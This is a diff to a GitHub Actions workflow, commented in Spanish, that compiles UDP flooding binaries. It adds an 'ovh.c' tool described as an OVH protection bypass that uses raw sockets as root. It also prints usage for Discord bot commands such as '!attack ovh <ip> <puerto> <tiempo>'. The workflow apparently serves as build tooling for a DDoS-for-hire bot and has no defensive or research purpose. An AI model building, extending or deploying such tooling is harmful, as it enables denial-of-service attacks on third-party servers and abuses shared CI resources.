@@ -29,7 +29,10 @@ jobs:
           pip install -U discord.py || true
 
       - name: Ensure build tools are available
-        run: sudo apt-get update && sudo apt-get install -y build-essential
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential
+          sudo apt-get install -y libpcap-dev || true
 
       - name: Build UDP binaries
         run: |
@@ -60,6 +63,19 @@ jobs:
             echo "✗ udppps.c no encontrado, omitiendo compilación de udppps"
           fi
 
+          # Compilar ovh.c (método OVH bypass)
+          if [ -f ovh.c ]; then
+            gcc -O3 -pthread ovh.c -o ovh || true
+            if [ -f ovh ]; then
+              echo "✓ Compilado: ovh (método OVH bypass)"
+              chmod +x ovh
+            else
+              echo "⚠ Error al compilar ovh.c, revisa dependencias"
+            fi
+          else
+            echo "✗ ovh.c no encontrado"
+          fi
+
           # Verificar udpflood.go
           if [ -f udpflood.go ]; then
             echo "✓ Encontrado: udpflood.go (método Go)"
@@ -71,7 +87,7 @@ jobs:
           # Listar archivos compilados
           echo ""
           echo "=== Archivos disponibles ==="
-          for bin in udp udphex udppps udpflood; do
+          for bin in udp udphex udppps ovh udpflood; do
             if [ -f "$bin" ]; then
               echo "✓ $bin (ejecutable)"
             else
@@ -95,6 +111,7 @@ jobs:
           echo "  !attack udphex <ip> <puerto> <tiempo>"
           echo "  !attack udppps <ip> <puerto> <tiempo>"
           echo "  !attack udpflood <ip> <puerto> <tiempo>"
+          echo "  !attack ovh <ip> <puerto> <tiempo>"
           echo "  !methods - Muestra información de métodos"
           echo "====================================="
           
@@ -102,10 +119,11 @@ jobs:
           echo "Probando Go..."
           go version
           
-          # Probar que podemos ejecutar el script Go
-          if [ -f udpflood.go ]; then
-            echo "Probando compilación de udpflood.go..."
-            go run udpflood.go 2>&1 | head -5 || echo "Error al probar udpflood.go"
+          # Verificar permisos para sudo si existe ovh
+          if [ -f ovh ]; then
+            echo "Verificando ejecutable ovh..."
+            ls -la ovh
+            echo "Nota: ovh requiere permisos de root para raw sockets"
           fi
           
           echo ""
